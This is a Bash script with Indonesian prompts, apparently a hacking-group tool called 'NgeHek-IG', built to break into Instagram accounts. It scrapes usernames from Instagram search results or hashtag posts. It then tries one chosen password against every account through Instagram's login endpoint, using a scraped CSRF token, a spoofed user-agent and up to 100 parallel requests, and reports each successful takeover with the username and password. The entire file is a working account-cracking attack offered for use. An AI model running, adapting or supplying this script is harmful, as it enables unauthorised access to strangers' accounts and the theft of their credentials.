#!/bin/bash
#author Zan

#color(bold)
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'
limit=100

clear
clear

echo -e "	\e[1;31m╔╗╔┌─┐┌─┐╦ ╦┌─┐┬┌─   ╦╔═╗\e[1;37m" 
echo -e "	\e[1;37m║║║│ ┬├┤ ╠═╣├┤ ├┴┐───║║ ╦\e[1;37m \e[1;31mAuthor : R4D3N G0Z4LL\e[1;37m"
echo -e "	\e[1;34m╝╚╝└─┘└─┘╩ ╩└─┘┴ ┴   ╩╚═╝\e[1;37m \e[1;31mYoutube : Exploit45 Crew\e[1;37m"
echo ""
echo ""
echo -e '''
	[ \e[1;32m1\e[1;37m ] Ambil Target Dari Username 
	[ \e[1;32m2\e[1;37m ] Ambil Target Dari HashTag  
'''
xdg-open https://youtu.be/LX9GalCA1P8
echo ""
echo ""
read -p $'[\e[1;33m?\e[1;37m] Masukan Pilihanmu : \e[1;32m' opt
touch target


case $opt in
    1) #menu 1
        read -p $'\e[37m[\e[34m?\e[37m] Cari dari username : \e[1;33m' ask
        collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
        echo $'\e[37m[\e[34m+\e[37m] Hanya Menemukan : \e[1;33m'$collect''$(< target wc -l ; echo -e "${white}user")
        read -p $'[\e[1;34m?\e[1;37m] Password yang akan di pakai : \e[1;33m' pass
        echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
xdg-open https://youtu.be/LX9GalCA1P8        
;;
    2) #menu 2
        read -p $'\e[37m[\e[34m?\e[37m] Cari dengan HashTag : \e[1;33m' hashtag
        get=$(curl -sX GET "https://www.instagram.com/explore/tags/${hashtag}/?__a=1")
        if [[ $get =~ "Page Not Found" ]]; then
        echo -e "$hashtag : ${red}HashTag Tidak Ditemukan${white}"
        exit
        else
            echo "$get" | jq -r '.[].hashtag.edge_hashtag_to_media.edges[].node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/"}' > result
            echo -e "${white}[${blue}!${white}] Menghilangkan Akun Yang Duplikat ${red}#$hashtag${white}"$(sort -u result > hashtag)
            echo -e "[${blue}+${white}] Hanya Menemukan : ${yellow}"$(< hashtag wc -l ; echo -e "${white}user")
            read -p $'[\e[34m?\e[37m] Password Yang Akan Di Pakai : \e[1;33m' pass
            echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
            for tag in $(cat hashtag); do
                echo $tag | xargs -P 100 curl -s | grep -o "alternateName.*" | cut -d "@" -f2 | cut -d '"' -f1 >> target &
            done
            wait
            rm hashtag result
fi        
        ;;
      *) #wrong menu
        echo -e "${white}Pilihan Menu Salah !"
        sleep 1
        clear
        bash ngehek-ig.sh
esac

#start_brute
token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
function brute(){
    url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
                    -H "cookie: csrftoken=${token}" \
                    -H "origin: https://www.instagram.com" \
                    -H "referer: https://www.instagram.com/accounts/login/" \
                    -H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" \
                    -H "x-csrftoken: ${token}" \
                    -H "x-requested-with: XMLHttpRequest" \
                    -d "username=${i}&password=${pass}")
                    login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
                    if [[ $login =~ "true" ]]; then
                            echo -e "[${green}+${white}] ${yellow}Berhasil Di Hack! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(curl -s "https://www.instagram.com/$i/" | grep "<meta content=" | cut -d '"' -f2 | cut -d "," -f1)
                        elif [[ $login =~ "false" ]]; then
                                    echo -e "[${red}!${white}] @$i - ${red}Gagal Di Hack${white}"
                            elif [[ $url =~ "checkpoint_required" ]]; then
                                    echo -e "[${cyan}?${white}] @$i ${white}: ${green}checkpoint${white}"
                    fi
}

#thread
(
    for i in $(cat target); do
        ((thread=thread%limit)); ((thread++==0)) && wait
        brute "$i" &
    done
    wait
)
